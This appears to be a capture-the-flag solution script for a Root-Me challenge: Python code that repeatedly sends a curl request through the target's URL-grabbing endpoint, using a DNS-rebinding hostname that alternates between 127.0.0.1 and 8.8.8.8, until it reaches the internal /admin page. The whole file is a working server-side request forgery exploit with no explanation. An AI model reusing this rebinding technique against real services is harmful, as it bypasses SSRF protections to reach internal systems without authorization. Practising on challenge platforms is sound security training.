import subprocess 

def send() -> str:
    process = subprocess.Popen(["curl http://challenge01.root-me.org:54022/grab?url=7f000001.08080808.rbndr.us:54022/admin"], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, _ = process.communicate()
    return str(out)

result = send()
while ("wow-so-clever" in result) or ("no_idea" in result) or ("Wait, what?" in result):
    result = send()

print(result)
